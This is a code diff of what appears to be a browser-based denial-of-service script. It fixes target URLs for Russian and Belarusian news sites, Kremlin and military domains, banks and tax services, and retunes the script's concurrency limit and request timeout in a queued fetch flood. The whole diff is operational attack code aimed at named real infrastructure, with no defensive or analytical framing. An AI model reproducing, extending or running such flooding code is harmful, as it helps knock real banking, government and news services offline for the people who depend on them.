@@ -227,52 +227,52 @@
             "number_of_errored_responses": 0,
             "error_message": "Failed to fetch"
         },
-            "ria.ru": {
+            "https://ria.ru": {
             "number_of_requests": 0,
             "number_of_errored_responses": 0,
             "error_message": "Failed to fetch"
         },
-            "gazeta.ru": {
+            "https://gazeta.ru": {
             "number_of_requests": 0,
             "number_of_errored_responses": 0,
             "error_message": "Failed to fetch"
         },
-            "kp.ru": {
+            "https://kp.ru": {
             "number_of_requests": 0,
             "number_of_errored_responses": 0,
             "error_message": "Failed to fetch"
         },
-            "riafan.ru": {
+            "https://riafan.ru": {
             "number_of_requests": 0,
             "number_of_errored_responses": 0,
             "error_message": "Failed to fetch"
         },
-            "pikabu.ru": {
+            "https://pikabu.ru": {
             "number_of_requests": 0,
             "number_of_errored_responses": 0,
             "error_message": "Failed to fetch"
         },
-            "kommersant.ru": {
+            "https://kommersant.ru": {
             "number_of_requests": 0,
             "number_of_errored_responses": 0,
             "error_message": "Failed to fetch"
         },
-            "mk.ru": {
+            "https://mk.ru": {
             "number_of_requests": 0,
             "number_of_errored_responses": 0,
             "error_message": "Failed to fetch"
         },
-            "yaplakal.com": {
+            "https://yaplakal.com": {
             "number_of_requests": 0,
             "number_of_errored_responses": 0,
             "error_message": "Failed to fetch"
         },
-            "rbc.ru": {
+            "https://rbc.ru": {
             "number_of_requests": 0,
             "number_of_errored_responses": 0,
             "error_message": "Failed to fetch"
         },
-            "bezformata.com": {
+            "https://bezformata.com": {
             "number_of_requests": 0,
             "number_of_errored_responses": 0,
             "error_message": "Failed to fetch"
@@ -632,12 +632,12 @@
             "number_of_errored_responses": 0,
             "error_message": "Failed to fetch"
         },
-        "constitution.kremlin.ru": {
+        "https://constitution.kremlin.ru": {
             "number_of_requests": 0,
             "number_of_errored_responses": 0,
             "error_message": "Failed to fetch"
         },
-        "forum.mil.ru": {
+        "https://forum.mil.ru": {
             "number_of_requests": 0,
             "number_of_errored_responses": 0,
             "error_message": "Failed to fetch"
@@ -742,7 +742,7 @@
             "number_of_errored_responses": 0,
             "error_message": "Failed to fetch"
         },
-        "www.nbrb.by": {
+        "https://www.nbrb.by": {
             "number_of_requests": 0,
             "number_of_errored_responses": 0,
             "error_message": "Failed to fetch"
@@ -826,7 +826,7 @@
             'https://baikalrosbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
             'https://byrich.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
             'https://www.vtb.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'norvikbank.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
+            'https://norvikbank.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
             'https://www.zemsky.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
             'https://www.unicreditbank.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
             'https://www.open.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
@@ -915,7 +915,7 @@
             'https://www.nalog.gov.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
             'http://newletters.kremlin.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
             'http://20.kremlin.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'constitution.kremlin.ru': { number_of_requests: 0, number_of_errored_responses: 0 },            
+            'https://constitution.kremlin.ru': { number_of_requests: 0, number_of_errored_responses: 0 },            
             'http://belres.by': { number_of_requests: 0, number_of_errored_responses: 0 },
             'http://belta.by': { number_of_requests: 0, number_of_errored_responses: 0 },
             'http://www.ctv.by': { number_of_requests: 0, number_of_errored_responses: 0 },
@@ -936,7 +936,7 @@
             'https://www.tvr.by/': { number_of_requests: 0, number_of_errored_responses: 0 },
             'https://yandex.by/': { number_of_requests: 0, number_of_errored_responses: 0 },
             'https://belarusbank.by/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'www.nbrb.by': { number_of_requests: 0, number_of_errored_responses: 0 },
+            'https://www.nbrb.by': { number_of_requests: 0, number_of_errored_responses: 0 },
             'https://brrb.by/': { number_of_requests: 0, number_of_errored_responses: 0 },
             'https://www.belapb.by/': { number_of_requests: 0, number_of_errored_responses: 0 },
             'https://bankdabrabyt.by/': { number_of_requests: 0, number_of_errored_responses: 0 }, 
@@ -954,7 +954,7 @@
         }
         setInterval(printStats, 100);
 
-        var CONCURRENCY_LIMIT = 1000
+        var CONCURRENCY_LIMIT = 200
         var queue = []
 
         async function fetchWithTimeout(resource, options) {
@@ -977,7 +977,7 @@
                     await queue.shift()
                 }
                 queue.push(
-                    fetchWithTimeout(target, { timeout: 3000 })
+                    fetchWithTimeout(target, { timeout: 600 })
                         .catch((error) => {
                             if (error.code === 20 /* ABORT */) {
                                 return;
